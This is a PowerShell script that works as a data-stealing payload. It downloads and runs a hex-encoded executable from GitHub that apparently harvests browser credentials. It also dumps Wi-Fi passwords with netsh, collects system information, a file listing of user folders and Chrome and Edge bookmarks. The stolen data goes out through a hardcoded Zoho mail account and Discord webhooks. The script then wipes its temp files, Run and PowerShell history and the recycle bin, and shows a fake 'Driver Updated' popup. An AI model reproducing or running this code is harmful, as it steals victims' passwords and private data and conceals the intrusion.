# Start logging the PowerShell session
Start-Transcript -Path "$env:TEMP\example-logs.txt" -Append

$global:isEmailSent = $false
$webhookUrl = 'https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
$totalSteps = 5
$currentDateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
function SetEmailSentTrue {$global:isEmailSent = $true}
function SetEmailSentFalse {$global:isEmailSent = $false}
function Send-ZohoEmail {
    param (
        [string]$FromEmail = "zqrvstef0rc5edk@zohomail.com",
        [string]$ToEmail = "jiead0128@gmail.com",
        [string]$Subject,
        [string]$Body = "Hello, this is a test email with an attachment.",
        [string[]]$Attachments = @(),  # Optional parameter for attachments
        [string]$SmtpServer = "smtp.zoho.com",
        [int]$Port = 587,
        [string]$Username = "zqrvstef0rc5edk@zohomail.com",
        [string]$Password = "LHjzKTbzDApt"
    )

    $email_webhookUrl = "https://discord.com/api/webhooks/1300835436918341745/yAGXpLFdBLnxfyQzn0wncm3rKsy3_m9mqc1KstctEIp25zs3iByJyNgEG036Oh7ENGMu"

    # Create the email message
    $mailMessage = New-Object System.Net.Mail.MailMessage
    $mailMessage.From = $FromEmail
    $mailMessage.To.Add($ToEmail)
    $mailMessage.Subject = $Subject
    $mailMessage.Body = $Body

    # Attach files if provided
    foreach ($attachmentPath in $Attachments) {
        if (Test-Path $attachmentPath) {
            $attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
            $mailMessage.Attachments.Add($attachment)
        } else {
            Write-Host "Warning: File not found - $attachmentPath"
        }
    }

    # Configure the SMTP client
    $smtpClient = New-Object Net.Mail.SmtpClient($SmtpServer, $Port)
    $smtpClient.EnableSsl = $true  # Enables STARTTLS
    $smtpClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)

    # Send the email
    try {
        Write-Host "Sending Email.... please wait..."
        $smtpClient.Send($mailMessage)
        # Write-Host "Email sent successfully to $ToEmail." + $Subject
        $message = "Email sent successfully to $toEmail. " + $Subject
        # Send the webhook notification
        Send-EmailNotification -ToEmail $toEmail -WebhookUrl $email_webhookUrl -Message $message
        SetEmailSentTrue
    } catch {
        Write-Host "Error: $_"
        SetEmailSentFalse
    } finally {
        # Clean up attachments and mail message
        foreach ($attachment in $mailMessage.Attachments) {
            $attachment.Dispose()
        }
        $mailMessage.Dispose()
    }
}
function Send-EmailNotification {
    param (
        [string]$ToEmail,
        [string]$WebhookUrl,
        [string]$Message
    )

    # Create the payload
    $payload = @{
        content = $Message
    } | ConvertTo-Json

    # Send the webhook notification
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
        Write-Host "Webhook notification sent successfully."
    } catch {
        Write-Host "Error sending webhook notification: $_"
    }
}
function RunWBPV {
        # Run WBPV 
        $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"  # Define the URL of the file to be downloaded
        $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
        Invoke-WebRequest -Uri $url -OutFile $tempPath # Use Invoke-WebRequest to download the file

        # OPEN THE PROGRAM BY CONVERTING HEX TO EXE AND RUN IN THE MEMORY
        $hexFilePath = Join-Path $env:TEMP "example.txt" # Path to the hex file in the %temp% directory
        $hexString = Get-Content -Path $hexFilePath -Raw # Read the hex string from the file

        # Convert the hex string to a byte array
        $bytes = [byte[]]::new($hexString.Length / 2)
        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
            $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
        }

        # Create a temporary file to hold the executable
        $tempExePath = Join-Path $env:TEMP "example.exe"
        [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
        $process = Start-Process $tempExePath # Start the executable

        #  SAVED DATA 
        $outputFilePath = "$env:TEMP\data.txt"
        Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
        Add-Type -AssemblyName System.Windows.Forms # Load the necessary assemblies for sending keys

        # Simulate CTRL+A and then CTRL+S to save the file
        [System.Windows.Forms.SendKeys]::SendWait("^(a)")  # Simulate CTRL+A
        Start-Sleep -Milliseconds 500  # Wait a moment for selection
        [System.Windows.Forms.SendKeys]::SendWait("^(s)")  # Simulate CTRL+S
        Start-Sleep -Milliseconds 1000  # Wait for save dialog to appear

        # Send the output file path and Enter
        [System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
        Start-Sleep -Milliseconds 500  # Wait for the input
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save

        Start-Sleep -Seconds 2 # Wait a moment for the file to save
        Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes

        ###############################################################################

        # SEND to EMAIL or WEBHOOK
        if (-not $isEmailSent) {
             # Email parameters
             $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
             $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
             Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
        }    

        if (-not $isEmailSent) { 
                $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable

                if (Test-Path $filePath) {
                    $fileContent = Get-Content -Path $filePath -Raw # Read the content of the text file

                    # Split the content into chunks of 2000 characters
                    $chunkSize = 2000
                    $chunks = [System.Collections.Generic.List[string]]::new()

                    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
                        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
                    }

                    # Calculate total chunks for progress increment
                    $totalChunks = $chunks.Count
                    $currentChunks = 1

                    # Send each chunk to the Discord webhook
                    foreach ($chunk in $chunks) {
                        # Create the payload for the webhook
                        $payload = @{
                            content = $chunk
                        } | ConvertTo-Json

                        # Try to send the content to the Discord webhook
                        try {
                            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
                            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
                        } catch {
                            Write-Host "Error sending request: $_"
                        }

                        # Inside the foreach loop, after each chunk is sent
                        $textBlock.Text = "WBPV Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks

                        # Increment to the next profile
                        $currentChunks++
                    }
                } else {
                    Write-Host "File not found: $filePath"
                    Add-Type -AssemblyName PresentationFramework
                    [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
                }
        }

        Write-Host "Operation $step / $totalSteps is done."
        SetEmailSentFalse
}
function GetWifiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }

    $results = @()

    foreach ($profile in $wifiProfiles) {
        $profileDetails = netsh wlan show profile name="$profile" key=clear
        $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
        $results += [PSCustomObject]@{
            ProfileName = $profile
            KeyContent  = $keyContent
        }
    }

    $results | Format-Table -AutoSize

    # Save results to a file
    $results | Out-File -FilePath "$env:TEMP\Wifi.txt"

    # Email file
    if (-not $isEmailsent) {
        $subject = "$env:USERNAME: Netsh Profiles - Sent on $currentDateTime"
        $attachments = @("$env:TEMP\Wifi.txt")  # Array of attachment file paths
        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
    }

    if (-not $isEmailsent) {
        foreach ($profile in $profiles) {
            $wlan = $profile.Matches.Value
            
            # Extract the Wi-Fi password
            try {
                $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
            } catch {
                Write-Host "Failed to retrieve password for $wlan"
                $passw = "N/A" # Assign a placeholder if password retrieval fails
            }
    
            # Build the message body for the webhook
            $Body = @{
                'username' = $env:username + " | " + [string]$wlan
                'content'  = [string]$passw
            }
    
            # Send the data to the Discord webhook
            try {
                Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
                Write-Host "Sending to Captain hook"
            } catch {
                Write-Host "Failed to send data to Discord webhook. Operation " + $step + "/" + $totalSteps
            }

            # Increment to the next profile
            $currentProfile++
            Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
        }

    }

    SetEmailSentFalse
}
function GatherSystemInfo {
    $sysInfoDir = "$env:TEMP\SystemInfo"
    if (-Not (Test-Path $sysInfoDir)) {
        New-Item -ItemType Directory -Path $sysInfoDir
    }

    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"

    if (-not $isEmailsent) {
        $subject = "$env:USERNAME: System Info - Sent on $currentDateTime"
        $attachments = @("$sysInfoDir\computer_info.txt","$sysInfoDir\process_list.txt","$sysInfoDir\service_list.txt","$sysInfoDir\network_config.txt")  # Array of attachment file paths
        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
    }
    
    SetEmailSentFalse
}
function ShowTree {
    param (
        [string]$Path = "C:\Users",
        [string]$OutputFile = "$env:TEMP\tree.txt"  # Change this path as needed
    )

    # Collect tree structure
    $treeOutput = Get-ChildItem -Path $Path -Recurse -File -ErrorAction SilentlyContinue |
        Where-Object { -not ($_.Attributes -match "System") } |
        ForEach-Object {
            $relativePath = $_.FullName.Replace($Path, "").TrimStart("\")
            $depth = ($relativePath -split "\\").Count
            "{0}{1}" -f (" " * ($depth - 1) * 2), $relativePath
        }

    # Save to file
    $treeOutput | Out-File -FilePath $OutputFile -Encoding UTF8

    # Optional: Display a message
    Write-Output "Tree structure saved to $OutputFile"

    # SEND to EMAIL or WEBHOOK
    if (-not $isEmailSent) {
        # Email parameters
        $subject = "$env:USERNAME: Tree Show - Sent on $currentDateTime"
        $attachments = @("$env:TEMP\tree.txt")  # Array of attachment file paths
        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
    } 

    SetEmailSentFalse
}
function GetBookmarks {
    # See if file is a thing
    Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf

    #If the file does not exist, write to host.
    if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -PathType Leaf)) {
        try {
            Write-Host "The chrome bookmark file has not been found. "
        }
        catch {
            throw $_.Exception.Message
        }
    }
    # Copy Chrome Bookmarks to Bash Bunny
    else {
        $F1 = "chrome_bookmarks.txt"
        Copy-Item "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Bookmarks" -Destination "$env:TEMP/$F1" 
            # SEND to EMAIL or WEBHOOK
            if (-not $isEmailSent) {
                # Email parameters
                $subject = "$env:USERNAME: Chrome Bookmarks - Sent on $currentDateTime"
                $attachments = @("$env:TEMP\chrome_bookmarks.txt")  # Array of attachment file paths
                Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
            } 
        }

    # See if file is a thing
    Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf

    #If the file does not exist, write to host.
    if (-not(Test-Path -Path "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -PathType Leaf)) {
        try {
            Write-Host "The edge bookmark file has not been found. "
        }
        catch {
            throw $_.Exception.Message
        }
    }
    # Copy Chrome Bookmarks to Bash Bunny
    else {
        $F2 = "edge_bookmarks.txt"
        Copy-Item "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" -Destination "$env:tmp/$F2" 
            # SEND to EMAIL or WEBHOOK
            if (-not $isEmailSent) {
                # Email parameters
                $subject = "$env:USERNAME: Edge Bookmarks - Sent on $currentDateTime"
                $attachments = @("$env:TEMP\edge_bookmarks.txt")  # Array of attachment file paths
                Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
            } 
    }

    SetEmailSentFalse
}
function ClearCache {

    #email log file
    if (-not $isEmailSent) {
        # Email parameters
        $subject = "$env:USERNAME: Logs - Sent on $currentDateTime"
        $attachments = @("$env:TEMP\example-logs.txt")  # Array of attachment file paths
        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
    } 

    # RunWBPV
    Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
    # GetWifiPasswords
    Remove-Item "$env:TEMP\wifi.txt" -Force -ErrorAction SilentlyContinue
    # GatherSystemInfo
    $tempFolderPath = [System.IO.Path]::GetTempPath()
    $folderToDelete = Join-Path -Path $tempFolderPath -ChildPath "SystemInfo"
    Remove-Item -Path $folderToDelete -Recurse -Force -ErrorAction SilentlyContinue
    # Remove-Item "$sysInfoDir\computer_info.txt" -Force -ErrorAction SilentlyContinue
    # Remove-Item "$sysInfoDir\process_list.txt" -Force -ErrorAction SilentlyContinue
    # Remove-Item "$sysInfoDir\service_list.txt" -Force -ErrorAction SilentlyContinue
    # Remove-Item "$sysInfoDir\network_config.txt" -Force -ErrorAction SilentlyContinue
    # ShowTree
    Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\example-logs.txt" -Force -ErrorAction SilentlyContinue
    # Get Bookmarks
    Remove-Item "$env:TEMP\chrome_bookmarks.txt" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\edge_bookmarks.txt" -Force -ErrorAction SilentlyContinue

    # Delete run box history
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

    # Delete powershell history
    Remove-Item (Get-PSreadlineOption).HistorySavePath

    # Deletes contents of recycle bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

for ($step = 1; $step -le $totalSteps; $step++) {
    # Perform your operation here
    switch ($step) {

        1 { RunWBPV }
        2 { GetWifiPasswords }
        3 { GatherSystemInfo }
        4 { ShowTree }
        5 { GetBookmarks}
    }
}

# Stop the transcript logging
Stop-Transcript

ClearCache

$done = New-Object -ComObject Wscript.Shell;$done.Popup("Driver Updated",1)